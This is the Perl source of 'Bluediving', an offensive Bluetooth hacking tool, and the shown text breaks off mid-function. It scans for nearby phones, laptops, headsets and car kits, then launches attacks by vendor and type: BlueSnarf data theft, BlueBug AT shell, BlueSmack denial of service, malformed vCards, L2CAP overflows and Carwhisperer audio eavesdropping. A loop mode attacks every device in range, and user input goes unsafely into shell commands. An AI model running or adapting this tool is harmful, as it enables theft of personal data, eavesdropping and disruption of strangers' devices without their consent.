#!/usr/bin/perl
#
# Bluediving - Hacking Bluetooth enabled devices.
#
# Programmed by Bastian Ballmann
# Web: http://www.datenterrorist.de
# Mail: Balle@chaostal.de
#
# First version: Mon Jan 10 10:28:26 CET 2005
# NG version: Tue Jun 28 18:17:21 CEST 2005
# Last update: Fri Dec 21 19:49:33 CET 2007
#
# License: GPL version 2
#
# ...there is no spoon.

###[ Loading modules ]###

use Env qw(PATH,IFS);
use XML::Simple;
use strict;
use Switch;

###[ Configuration ]###

die "$0 [device]\n" if $ARGV[0] eq "--help";

my %preferences;
my $configfile = "bluedivingNG.conf";

my $cfg = XMLin($configfile) or die "Cannot read config file $configfile!\n$!\n";

# Device
$preferences{'device'} = $cfg->{'device'};
$preferences{'device'} = $ARGV[0] if defined $ARGV[0];
$preferences{'device'} = "hci0" if $preferences{'device'} eq "";

# Number of dongles
$preferences{'number_of_dongles'} = $cfg->{'number_of_dongles'};

# Scan mode
$preferences{'scan_mode'} = $cfg->{'scan_mode'};

# Where to keep logs?
$preferences{'logdir'} = $cfg->{'logdir'};

# Main logfile
$preferences{'logfile'} = $preferences{'logdir'} . $cfg->{'logfile'};

# Play sound?
# 1 == yes / 0 == no
$preferences{'play_sound'} = $cfg->{'play_sound'};

# Sound file
$preferences{'sound_file'} = $cfg->{'sound_file'};

# Sound file
$preferences{'raw_file'} = $cfg->{'raw_file'};

# My nasty vcard
$preferences{'vcard'} = $cfg->{'vcard'};

# Default channel
$preferences{'channel'} = $cfg->{'channel'};

# Default device name
$preferences{'device_name'} = $cfg->{'device_name'};

# Default device type
# Phone, Laptop...
$preferences{'device_type'} = $cfg->{'device_type'};

# Should the device be visible?
# 0 == no / 1 == yes
$preferences{'device_visibility'} = $cfg->{'device_visibility'};

# Clear environment
$ENV{'PATH'} = "/usr/bin:/usr/sbin:.";
$ENV{'IFS'} = "/";



###[ MAIN PART ]###

my $version = "0.9";

# Specific device logdir
my $devicedir = "";

# Remember seen devices
my %seen;

# New devices found on the air
my @new_devices;

# My target device
my $target;

# My last menu
my $last_menu;

# My last RFCOMM device
my $rfcomm_device = 0;

# Dont print menu?
my $no_menu = 0;

# Run in loop mode?
my $loop_mode = 0;

# Device type map
my %device_type = ("phone" => "0x000204",
		   "laptop" => "0x00010c",
                   "headset" => "0x000408",
                   "desktop" => "0x000104",
                   "apple" => "0x102104",
                   "carkit" => "0x001f00");

my %device_id = ("0204" => "phone",
                 "010c" => "laptop",
                 "0408" => "headset",
                 "0104" => "laptop",
                 "2104" => "laptop",
                 "1f00" => "carkit");

# Vendor map
my %vendor_map = undef;

# Init program
init_program();

# Print header
#my $muh = "BluedivingNG $version"; 
#print "\n" . $muh . "\n";
#print "-" x length($muh) . "\n";
#print " Next generation bluetooth security tool.\n\n";

print "  _    _             _ _     _           \n";
print " | |__| |_  _ ___ __| (_)_ _(_)_ _  __ _ \n";
print " | '_ \\ | || / -_) _` | \\ V / | ' \\/ _` |\n";
print " |_.__/_|\\_,_\\___\\__,_|_|\\_/|_|_||_\\__, |\n";
print "                      version $version  |___/ \n";


# Go get it
while(1){ print_mainmenu(); }



###[ MENU SUBROUTINES ]###

# Print menu and handle user input
sub print_menu
{
    my @menu = @_;

    print "\n". "-="x30 . "-\n";

    # Menu name
    print "$menu[0]\n\n";

    # Print the menu
    for(my $i=1; $i<scalar(@menu); $i++)
    {
	print "[$i] " . $menu[$i]->[0] . "\n";
    }

    print "-="x25 . " [x] Exit -\n\n";

    # Get user input
    print ">>> ";
    my $input = <STDIN>;
    chomp $input;

    # Check user input
    exit_program() if(($input eq "exit") || ($input eq "quit"));

    switch($input) {
     case "m" { &print_mainmenu() }
     case "a" { &print_actionmenu() }
     case "i" { &print_infomenu() }
     case "e" { &print_exploitmenu() }
     case "t" { &print_toolsmenu() }
     case "x" { &exit_program() }
    }

    &{$last_menu} if $input eq "";

    if(($input > scalar(@menu)) || ($input == 0))
    {
	print "<<< ERROR! Undefined input.\n";
	&{$last_menu};
    }
    else
    {
	# Execute the command
	print "\n";
	&{$menu[$input]->[1]()};
    }
}

# Print the main menu
sub print_mainmenu
{
    my @menu = ('[MAIN MENU] menu: [a] Action [e] Exploit [i] Info [t] Tools',
		['Scan', \&scan],
		['Scan and attack', \&scan_and_attack],
		['Scan and info', \&scan_and_info],
		['Scan for...', \&scan_for_device_type],
		['Add Known Device', \&add_known_device],
		['Change preferences', \&change_preferences],
		['Show preferences', \&show_preferences],
		['Show logfile', \&print_logfile]);

    $last_menu = \&print_mainmenu;
    print_menu(@menu);
}

# Print Info menu
sub print_infomenu
{
    my @menu = ('[INFO MENU] menu: [m] Main [a] Action [e] Exploit [t] Tools',
		['Choose a target', \&get_a_target],
		['Get info', \&get_device_info],
		['Get services', \&get_device_services],
		['Find service', \&find_channel],
		['Get vendor', \&get_device_vendor],
		['Check connection', \&check_connection],
		['Show new devices', \&show_new_devices],
		['Show all devices', \&show_all_devices]);

    $last_menu = \&print_infomenu;
    print_menu(@menu);
}

# Print action menu
sub print_actionmenu
{
    my @menu = ('[ACTION MENU] menu: [m] Main [e] Exploit [i] Info [t] Tools',
		['Choose a target', \&get_a_target],
		['Try all exploits', \&try_all_exploits],
		['Try all attacks', \&try_all_attacks],
		['Automatic attack', \&attack],
		['Change your bluetooth address', \&change_btaddr],
		['Send soundfile', \&send_sound],
		['Scan RFCOMM channels', \&rfcomm_scan],
		['Launch RFCOMM shell', \&launch_rfcomm_shell],
		['RFCOMM Connection', \&rfcomm_connection],
		['HCI Connection', \&hci_connection],
                ['Reset connection', \&reset_connection_via_l2cap_command_rej],
		['Request new link key', \&request_paiting]);

    $last_menu = \&print_actionmenu;
    print_menu(@menu);
}

# Print exploit menu
sub print_exploitmenu
{
    my @menu = ('[EXPLOIT MENU] menu: [m] Main [a] Action [i] Info [t] Tools',
		['Choose a target', \&get_a_target],
		['Blue Snarf', \&bluesnarf],
		['Blue Snarf++', \&bluesnarf2],
		['Blue Snarf Ericsson', \&bluesnarf_ericsson],
		['Blue Bug', \&bluebug],
		['Blue Bug AT shell', \&bluebug_atshell],
		['Helo Moto', \&helomoto],
		['Blue Smack', \&bluesmack],
		['Stop Blue Smack', \&stop_bluesmack],
		['Nasty VCard', \&send_nasty_vcard],
		['Symbian Remote Restart', \&symbian_remote_restart],
		['Hcidump Overflow', \&hcidump_crash],
		['L2CAP header size overflow', \&l2cap_headersize_overflow]);

    $last_menu = \&print_exploitmenu;
    print_menu(@menu);
}

# Print tools menu
sub print_toolsmenu
{
    my @menu = ('[TOOLS MENU] menu: [m] Main [a] Action [e] Exploit [i] Info',
		['Choose a target', \&get_a_target],
		['Carwhisperer', \&launch_carwhisperer],
		['BSS', \&launch_bss],
		['L2CAP packet generator', \&launch_l2cappacket],
		['Launch greenplaque', \&launch_greenplaque],
		['Launch redfang', \&launch_redfang],
                ['Launch btftp', \&launch_btftp]);
 
    $last_menu = \&print_toolsmenu;
    print_menu(@menu);
}

# Choose a target from the new devices list
sub get_a_target
{
    my @devices;

    if (!%seen) {
        print "No devices found yet!\n";
        print_mainmenu();
        return;
    }

    print "Want to see all devices? <Y/n>: ";
    my $input = <STDIN>;
    chomp $input;

    if(lc($input) eq "n")
    {
	show_new_devices();
	@devices = @new_devices;
    }
    else
    {
	my $i = 1;

	while(my($key,$value) = each %seen)
	{
	    push @devices, $key;
	    print "[$i] $key " . $value->{'host'} . " " . $value->{'class'} . "\n";
	    $i++;
	}
    }

    # Get user input
    print ">>> ";
    $input = <STDIN>;
    chomp $input;

    # Check user input
    exit_program() if(($input eq "exit") || ($input eq "quit"));
    $input = 1 unless $input =~ /\d/;

    if(($input > scalar(@devices)) || ($input == 0))
    {
	print "<<< ERROR! Undefined input.\n";
	print_mainmenu();
    }

    $target = $devices[$input-1];    
    &{$last_menu} unless $no_menu;
}

# Find the channel for a service
sub find_channel
{
    if($target eq "")
    {
	print "<<< I need a target!\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "Service: ";
    my $input = <STDIN>;
    chomp($input);

    die "Go home.\n" unless $input =~ /^\w+/;
    my $channel = get_channel($target, $input);

    if($channel == 0)
    {
	print "Can't find service $input\n";
    }
    else
    {
	print "Service $input is on channel $channel.\n";
    }

    &{$last_menu} unless $no_menu;
}

# Try browse SDP to get the channel for a service
# Parameter: addr, service
# Return: channelnr
sub get_channel
{
    my ($addr,$service) = @_;
    my $flag = 0;
    my $channel = 0;

    return unless (defined $addr) && (defined $service);

    open(SDP,"$cfg->{'sdptool'} browse $target |") or print $!;

    while(<SDP>)
    {
	$flag = 1 if($_ =~ /Service name: $service/ig);	
	if(($flag == 1) && ($_ =~ /Channel: (\d+)/))
	{
	    $channel = $1;
	    last;
	}
    }

    close(SDP);
    return $channel;
}

# Ask the user to change the default channel
sub ask_channel
{
    print "Default channel is $preferences{'channel'}\n";
    print "Want to change it? (y/N): ";
    
    my $input = <STDIN>;
    chomp $input;
    
    if($input eq "y")
    {
	print "Tell me the channel number: ";
	
	$input = <STDIN>;
	chomp $input;
	
	die "Go home." unless $input =~ /\d{1,2}/;
	$preferences{'channel'} = $input;
    }
}

# Ask user for device type
sub ask_device_type
{
   my @device_types = keys %device_type;

   for(my $i=1; $i <= scalar(@device_types); $i++)
   {
      print "[$i] $device_types[$i-1]\n";
   }    

    # Get user input
    print ">>> ";
    my $input = <STDIN>;
    chomp $input;

    # Check user input
    exit_program() if(($input eq "exit") || ($input eq "quit"));
    die "Go home.\n" unless $input =~ /\d/;

    if($input > scalar(@device_types))
    {
	print "<<< ERROR! Undefined input.\n";
	print_mainmenu();
    }

    return $device_types[ $input -1 ];
}


###[ NORMAL SUBROUTINES ]###

# Scan for new devices
# Parameter device type to scan for (optional)
sub scan
{
    my $type_to_scan = shift;
    @new_devices = ();
    my ($host,$addr,$class);

    # Scan for new devices
    if($type_to_scan eq "")
    {
       print "<<< Start scanning for bluetooth devices...\n";
    }
    else
    {
       print "<<< Start scanning for $type_to_scan devices...\n";
    }

    if(lc($preferences{'scan_mode'}) eq "greenplaque")
    {
    	launch_greenplaque($type_to_scan);
    }
    else
    {
    	open(HCI,"$cfg->{'hcitool'} -i $preferences{'device'} inq|") or die "$!\n";
    
        while(<HCI>)
        {
            next if $_ =~ /Inquiring/;

            if($_ =~ /(\w\w\:\w\w\:\w\w\:\w\w\:\w\w\:\w\w)/)
            {
	       $addr = $1;
            }

            if($_ =~ /class: (0x\w\w\w\w\w\w)/)
            {
	       $class = $1;
            }
	
            # Found a new device
            if( ($addr ne "") && ($seen{$addr} eq "") )
	    {
               open(HCI2,"$cfg->{'hcitool'} -i $preferences{'device'} name $addr|") or die "$!\n";
               my $host = <HCI2>;
               close(HCI2);
               chomp $host;

	       $seen{$addr}->{'host'} = $host;
	       $seen{$addr}->{'class'} = $class;
               $seen{$addr}->{'type'} = get_device_type_by_id($class);

               if($type_to_scan eq "" || $seen{$addr}->{'type'} eq $type_to_scan)
               {
	           print "<<< " . localtime(time) . " Found host $host addr $addr class $class " . $seen{$addr}->{'type'} ."\n";
                   print LOG localtime(time) . " Found host $host addr $addr class $class " . $seen{$addr}->{'type'} . "\n";
	    
	           $devicedir = $preferences{'logdir'} . $addr;
	           unlink($devicedir) if -e $devicedir;
	           mkdir($devicedir);
	    
	           # Play sound?
	           system("$cfg->{'play'} $preferences{'sound_file'} > /dev/null 2> /dev/null") if $preferences{'play_sound'};
	    
	           push @new_devices,$addr;
               }
	    }
        }

        close(HCI);
    }

    if(scalar(@new_devices) == 0)
    {
	print "<<< Found no devices.\n";
    }
    else
    {
	$target = $new_devices[0];
    }
}

# rather than scanning, add an existing (known) address
sub add_known_device {
    print "<<< Manually add a known bluetooth device...\n";

    print "Enter device address: ";
    my $addr = <STDIN>;
    chomp $addr;

    if($addr !~ /\w\w\:\w\w\:\w\w\:\w\w\:\w\w\:\w\w/) {
        print "Invalid address format!\n";
        return;
    }

    print "Enter a nickname for this device: ";
    my $host= <STDIN>;
    chomp $host;

    $seen{$addr}->{'host'} = $host;
    push @new_devices,$addr;
    $target = $new_devices[0];
	    
    $devicedir = $preferences{'logdir'} . $addr;
    unlink($devicedir) if -e $devicedir;
    mkdir($devicedir);
 
    print "Device $host ($addr) registered.\n";
}

# Show new devices
sub show_new_devices
{
    if(scalar(@new_devices) > 0)
    {
	for(my $i=1; $i<scalar(@new_devices); $i++)
	{
	    print "[$i] $new_devices[$i] " . $seen{$new_devices[$i]}->{'host'} . " " . $seen{$new_devices[$i]}->{'type'} . "\n";
	}
    }
    else
    {
	print "<<< There are no new devices.\n";
    }
}

# Show all devices
sub show_all_devices
{
    my $flag = 1;
    
    while(my($key,$value) = each %seen)
    {
	print "[$flag] $key $value\n";
	$flag++;
    }

    print "<<< No devices at all...\n" if $flag == 1;
}

# Scan RFCOMM channels
sub rfcomm_scan
{
    my $start = 1;
    my $end = 20;

    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "From ($start): ";
    my $input = <STDIN>;
    chomp $input;
    
    if($input ne "")
    {	    
	die "Go home." unless $input =~ /^\d+$/;
	$start = $input;
    }
    
    print "To ($end): ";
    $input = <STDIN>;
    chomp $input;
    
    if($input ne "")
    {	    
	die "Go home." unless $input =~ /^\d+$/;
	$end = $input;
    }
    
    print "Start scanning $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ") from $start to $end\n";
    
    for(my $i=$start; $i<=$end; $i++)
    {
	print "Trying to connect to channel $i\n";
	system("$cfg->{'rfcomm'} -i $preferences{'device'} connect $rfcomm_device $target $i");
	$rfcomm_device++;	    
    }
    
    system("$cfg->{'rfcomm'} -i $preferences{'device'} release all");
    $rfcomm_device = 0;

    &{$last_menu} unless $no_menu;
}


# Make a RFCOMM connection
sub rfcomm_connection
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    ask_channel();
    print "Shall I [c]onnect or [b]ind? (default connect): ";
	
    my $input = <STDIN>;
    chomp $input;
    
    if(($input eq "bind") || ($input eq "b"))
    {
	print "<<< Trying to bind to $target:$preferences{'channel'} on rfcomm device $rfcomm_device";
	system("$cfg->{'rfcomm'} -i $preferences{'device'} bind $rfcomm_device $target $preferences{'channel'}");
    }
    elsif(($input eq "connect") || ($input eq "c") || ($input eq ""))
    {
	print "<<< Trying to connect to $target:$preferences{'channel'} on rfcomm device $rfcomm_device";
	system("$cfg->{'rfcomm'} -i $preferences{'device'} connect $rfcomm_device $target $preferences{'channel'}");
    }
    else
    {
	die("Go home.");
    }

    $rfcomm_device++;
    &{$last_menu} unless $no_menu;
}

# Make a HCI connection
sub hci_connection
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "<<< Trying a HCI connection to $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ")\n";
    system("$cfg->{'hcitool'} -i $cfg->{'device'} cc $target");
    &{$last_menu} unless $no_menu;
}

# Request new pairing process
sub request_pairing
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	get_a_target();
    }

    print "<<< Requesting new link key to $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ")\n";
    system("$cfg->{'hcitool'} -i $cfg->{'device'} key $target");
    &{$last_menu} unless $no_menu;
}

# Change your bluetooth address
sub change_btaddr
{
    my $input = shift;

    unless($input =~ /^[0-9A-F]{2,2}\:[0-9A-F]{2,2}\:[0-9A-F]{2,2}\:[0-9A-F]{2,2}\:[0-9A-F]{2,2}\:[0-9A-F]{2,2}$/i)
    {
       print "NOTE! This is currently only implemented for CSR, Ericsson and Zeevo chipsets.\n";
       print "SAVE YOUR OLD ADDRESS TO RESTORE IT!\n";
       print "Press ENTER to abort or give me the new address\n";
       print ">>> ";
    
       $input = <STDIN>;
       chomp $input;
    }
    
    &{$last_menu} if $input eq "";
    die "Go home.\n" unless $input =~ /^[0-9A-F]{2,2}\:[0-9A-F]{2,2}\:[0-9A-F]{2,2}\:[0-9A-F]{2,2}\:[0-9A-F]{2,2}\:[0-9A-F]{2,2}$/i;


    # Set new address
    print "<<< Changing address to $input.\n";
    system("$cfg->{'change_btaddr'} -i $preferences{'device'} $input");

    # Is this a CSR device?
    my $chip = get_device_chip();

    if($chip =~ /Cambridge Silicon Radio/ig)
    {
    	system("$cfg->{'bccmd'} -d $preferences{'device'} warmreset");
    }
    else
    {
    	# Reset the device
        print "<<< Resetting device (maybe you have to unplug, plug in and up it)\n";
        system("$cfg->{'hciconfig'} $preferences{'device'} reset");
        print "\n<<< New config\n";
        system("$cfg->{'hciconfig'} $preferences{'device'} revision");
    }

    &{$last_menu} unless $no_menu;
}

# Send a sound file to the audio gateway
sub send_sound
{
    my $file;

    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "Which soundfile shall I use?\n";
    print "This? $preferences{'sound_file'} <Y/n>: ";
    
    my $input = <STDIN>;
    chomp $input;
    
    if($input eq "n")
    {
	print "Give me the absolute filename!\n";
	print ">>> ";
	
	$file = <STDIN>;
	chomp $file;
	
	die "Go home." unless $file =~ /[a-zA-Z\/\.]/g;
    }
    else
    {
	$file = $preferences{'sound_file'};
    }
    
    $preferences{'channel'} = get_channel($target,"Voice Gateway");
    ask_channel() if $preferences{'channel'} == 0;
    
    print "Sending $file to $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ") channel $preferences{'channel'}\n";
    system("$cfg->{'mpg123'} -q -s '$file' | $cfg->{'sox'} -t raw -r 44100 -c 2 -s -w - -t raw -r 8000 -c 1 -s -w - | $cfg->{'hstest'} play - $target $preferences{'channel'}");

    &{$last_menu} unless $no_menu;
}


###[ ATTACK SUBROUTINES ]###

# Scan and attack
sub scan_and_attack
{
    print "Loop it? <Y/n>: ";    
    my $input = <STDIN>;
    chomp $input;
    
    $no_menu = 1;
    $loop_mode = 1 if lc($input) ne "n";

    print "Specify device type? <Y/n>: ";    
    $input = <STDIN>;
    chomp $input;
    
    $no_menu = 1;
    my $device_type_to_attack = "";

    if(lc($input) ne "n")
    {
       $device_type_to_attack = ask_device_type();
    }  

    while(1)
    {
       scan($device_type_to_attack);

       for(@new_devices)
       {
          $target = $_;

          get_device_services();
          get_device_info();
          attack();
       }

       last if lc($input) eq "n";
       sleep $preferences{'loop_timeout'};
    }

    $no_menu = 0;
    &{$last_menu};
}

# Scan and info
sub scan_and_info
{
    print "Loop it? <Y/n>: ";    
    my $input = <STDIN>;
    chomp $input;
    
    $no_menu = 1;
    $loop_mode = 1 if lc($input) ne "n";

    print "Specify device type? <Y/n>: ";    
    $input = <STDIN>;
    chomp $input;
    
    $no_menu = 1;
    my $device_type_to_attack = "";

    if(lc($input) ne "n")
    {
       $device_type_to_attack = ask_device_type();
    }  

    while(1)
    {
       scan($device_type_to_attack);

       for(@new_devices)
       {
          $target = $_;

          get_device_services();
          get_device_info();
       }

       last unless $loop_mode;
       sleep $preferences{'loop_timeout'};
    }

    $no_menu = 0;
    &{$last_menu};
}

# Scan for special device type
sub scan_for_device_type
{
    my $device_type = ask_device_type();
    scan( $device_type );

    $no_menu = 0;
    &{$last_menu};
}

# Attack new devices
sub attack
{
    my @targets = ();

    $no_menu = 1;
    
    if($target eq "")
    {
        @targets = @new_devices;       
    }
    else
    {
        push @targets, $target;
    }

    for(@targets)
    {
	my $id = get_device_vendor($_);
	$target = $_;

	# Nokia
	if($id =~ /Nokia/)
	{
	    bluesnarf();
	}

	# Ericsson
	elsif($id eq "Ericsson")
	{
	    bluesnarf_ericsson();
	}

	# Motorola
	elsif($id eq "Motorola")
	{
	    bluebug();
	}

        # Device type carkit or headset
        if( ($seen{$_}->{'type'} eq "carkit") || ($seen{$_}->{'type'} eq "headset") )
        {
            launch_carwhisperer();        
        }

        # Device type laptop
        elsif($seen{$_}->{'type'} eq "laptop")
        {
            launch_btftp();
        }

        # Device type mobile phone
        elsif($seen{$_}->{'type'} eq "phone")
        {
	    send_nasty_vcard();
#	    bluesmack();
            symbian_remote_restart();
            l2cap_headersize_overflow();
        }
    }

    $no_menu = 0;
}

# Try all exploits on a single device
sub try_all_exploits
{
    $no_menu = 1;

    if($target eq "")
    {
	print "<<< I need a target.\n";
	get_a_target();
    }

    bluesnarf();
    bluesnarf2();
    bluesnarf_ericsson();
    bluebug();
    helomoto();
    bluesmack();
    send_nasty_vcard();
    symbian_remote_restart();
    hcidump_crash();
    l2cap_headersize_overflow();

    $no_menu = 0;
    &{$last_menu};
}

# Try all tools
sub try_all_tools
{
    $no_menu = 1;

    if($target eq "")
    {
	print "<<< I need a target.\n";
	get_a_target();
    }

    launch_carwhisperer();
    launch_bss();

    $no_menu = 0;
    &{$last_menu};
}

# Try all attacks on a single device
sub try_all_attacks
{
    $no_menu = 1;

    if($target eq "")
    {
	print "<<< I need a target.\n";
	get_a_target();
    }

    try_all_exploits();
    try_all_tools();

    $no_menu = 0;
    &{$last_menu};
}


###[ TOOLS SUBROUTINES ]###

# Launch Redfang
sub launch_redfang
{
    system("$cfg->{'redfang'} hunt 1");
}

# Launch Greenplaque
# Parameter device type to scan for (optional)
sub launch_greenplaque
{
    my $type_to_scan = shift;
    my $number = get_number_of_hci_devices();

    if($number !~ /^\d+$/)
    {
       print ">>> Number of dongles to use: ";
       $number = <STDIN>;
       chomp($number);

       &{$last_menu} unless $number =~ /^\d+$/;
    }

    if($number == 1)
    {
       print "<<< Greenplaque scanning mode need two or more hci devices\n";
       print "<<< Switching to hcitool scanning mode.\n";
       $preferences{'scan_mode'} = "hcitool";
       scan($type_to_scan);
    }
    else
    {
       print "<<< Scan mode greenplaque (using $number hci devices)\n";
       open(GREEN, "$cfg->{'greenplaque'} -n $number |");
       my $class_line = "";

       while(<GREEN>)
       {	
          $class_line = $_ if $_ =~ /class:/;

          if($_ =~ /Discovered\: (.+?) \[(\w\w\:\w\w\:\w\w\:\w\w\:\w\w\:\w\w)\]/i)
          {
        	my $host = $1;
                my $addr = $2;
                my $class = "unkown";

                if($class_line =~ /^$addr\s+class: (0x\w\w\w\w\w\w)/)
                {
                   $class = $1;
                }

                # Discovered a new device? Remember!
                if( ($addr ne "") && ($seen{$addr} eq "") )
	        {
	                $seen{$addr}->{'host'} = $host;
	                $seen{$addr}->{'class'} = $class;
                        $seen{$addr}->{'type'} = get_device_type_by_id($class);

                        if($type_to_scan eq "" || $seen{$addr}->{'type'} eq $type_to_scan)
                        {
	        	   print "<<< " . localtime(time) . " Found host $host addr $addr class $class " . $seen{$addr}->{'type'} ."\n";
	                   print LOG localtime(time) . " Found host $host addr $addr class $class " . $seen{$addr}->{'type'} . "\n";
	    
	                   $devicedir = $preferences{'logdir'} . $addr;
	                   unlink($devicedir) if -e $devicedir;
	                   mkdir($devicedir);
	    
	                   # Play sound?
	                   system("$cfg->{'play'} $preferences{'sound_file'} > /dev/null 2> /dev/null") if $preferences{'play_sound'};
	    
	                   push @new_devices,$addr;
                        }
                }
          }
       }

       close(GREEN);
    }

    &{$last_menu} unless $no_menu;
}

# Launch carwhisperer
sub launch_carwhisperer
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "<<< Whispering to $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'class'} . ")\n";
    system("$cfg->{'carwhisperer'} $preferences{'device'} $preferences{'raw_file'} $devicedir/carwhisperer.raw $target");
}


# Launch BSS
sub launch_bss
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "<<< Starting BSS on $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'class'} . ")\n";
    system("$cfg->{'bss'} -m 0 $target | tee $devicedir/bss.log");
}


# Launch RFCOMM shell
sub launch_rfcomm_shell
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }
    
    ask_channel();
    print "<<< Trying to connect to RFCOMM channel $preferences{'channel'} on $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'class'} . ")\n";
    system("$cfg->{'rfcomm_shell'} $target $preferences{'channel'}");
}

sub launch_btftp
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    my $channel = get_channel($target, "OBEX File Transfer");

    system("$cfg->{'btftp'} $target $channel");
}

# Launch L2CAP packetgenerator
sub launch_l2cappacket
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    my $code;

    while(1)
    {
    	print ">>> L2CAP code: ";
        $code = <STDIN>;
        chomp $code;

        if($code =~ /^\d+$/)
        {
           last;
        }
        else
        {
           print "<<< Not a number! Retry.\n";
        }
    }

    my $ident;

    while(1)
    {
    	print ">>> L2CAP ident: ";
        $ident = <STDIN>;
        chomp $ident;

        if($ident =~ /^\d+$/)
        {
           last;
        }
        else
        {
           print "<<< Not a number! Retry.\n";
        }
    }

    print ">>> L2CAP payload: ";
    my $payload = <STDIN>;
    chomp $payload;
    $payload =~ s/\\\'\;\&//g;


    my $headersize;

    while(1)
    {
    	print ">>> L2CAP header size: ";
        $headersize = <STDIN>;
        chomp $headersize;

        if($headersize =~ /^\d+$/)
        {
           last;
        }
        else
        {
           print "<<< Not a number! Retry.\n";
        }
    }

    print "<<< Sending packet to $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ")\n";

    system("$cfg->{'l2cappacket'} -a $target -c $code -i $ident -p '$payload' -s $headersize");
}



###[ INFO SUBROUTINES ]###

# Get available infos
sub get_device_info
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }
    die "FATAL! $devicedir/info is a symbolic link!\n" if -l ("$devicedir/info");
    
    system("$cfg->{'hcitool'} -i $cfg->{'device'} info $target > $devicedir/info");
    open(INFO, "< $devicedir/info");
    my @info = <INFO>;
    close(INFO);

    if(scalar(@info) == 0)
    {
    	print "<<< No info available for $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ")\n";
    }
    else
    {
    	map { print; } @info;
    }

    &{$last_menu} unless $no_menu or $loop_mode;
}

# Get available services
sub get_device_services
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    die "FATAL! $devicedir/services is a symbolic link!\n" if -l ("$devicedir/services");
    system("$cfg->{'sdptool'} browse $target > $devicedir/services");
    open(SDP, "<$devicedir/services");
    my @sdp = <SDP>;
    close(SDP);

    if(scalar(@sdp) == 0)
    {
    	print "<<< Target $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ") seems to have no running sdp daemon.\n";
    }
    else
    {
    	print "SDP records of target $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . "):\n\n";
    	map { print if $_ =~ /Name/ or $_ =~ /Channel/; } @sdp;
    }

    &{$last_menu} unless $no_menu or $loop_mode;
}

# Detect device vendor
sub get_device_vendor
{
    $target =~ /(\w\w:\w\w:\w\w)/;
    my $first_three_byte = $1;

    my $vendor = $vendor_map{$first_three_byte};
    $vendor = "unknown" if $vendor eq "";

    print "<<< " . localtime(time) . " $target (" . $seen{$target}->{'host'} . ") is from vendor $vendor\n";
    print LOG localtime(time) . " $target (" . $seen{$target}->{'host'} . ") is from vendor $vendor\n";

    &{$last_menu} unless $no_menu;
    return $vendor;
}

# Get device type by class id
sub get_device_type_by_id
{
   my $class = shift;

   $class = substr($class, 4, length($class));
   $device_id{$class} ? return $device_id{$class} : return"unkown";
}

# Check the connection with a single l2cap packet
sub check_connection
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "<<< Checking connection of $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ")\n";
    open(L2PING,"$cfg->{'l2ping'} -c 1 $target |");
    while(<L2PING>){ print; }
    close(L2PING);
    &{$last_menu};
}

# Get local device name
sub get_device_name
{
    my $name = "unkown";

    open(HCI,"$cfg->{'hciconfig'} $preferences{'device'} name |") or print $!;

    while(<HCI>)
    {
	$name = $1 if $_ =~ /Name: \'(.*)\'/i;
    }

    close(HCI);
    return $name;
}

# Set local device name
sub set_device_name
{
    my $name = shift;
    
    if($name eq "")
    {
	print "<<< I need a device name to set!\n";
    }
    else
    {
	print "<<< Setting device name to $name\n";
	system("$cfg->{'hciconfig'} $preferences{'device'} name '$name'");
    }
}

# Get local device address
sub get_device_address
{
    my $addr = "unkown";

    open(HCI,"$cfg->{'hciconfig'} $preferences{'device'} |") or print $!;

    while(<HCI>)
    {
	$addr = $1 if $_ =~ /BD Address: (.+?) ACL/i;
    }

    close(HCI);
    return $addr;
}

# Get local device chipset
sub get_device_chip
{
    my $chip = "unkown";

    open(HCI,"$cfg->{'hciconfig'} $preferences{'device'} version|") or print $!;

    while(<HCI>)
    {
	$chip = $1 if $_ =~ /Manufacturer: (.+)/i;
    }

    close(HCI);
    return $chip;
}

# Count number of local hci devices
sub get_number_of_hci_devices
{
    my $number = 0;

    open(HCI,"$cfg->{'hciconfig'} -a|") or print $!;

    while(<HCI>)
    {
       $number++ if $_ =~ /^hci\d+\:\s+/;
    }

    close(HCI);

    return $number;
}

# Set device type
sub set_device_type
{
    my $name = shift;
    my $hex = $device_type{lc($name)};

    if($hex eq "")
    {
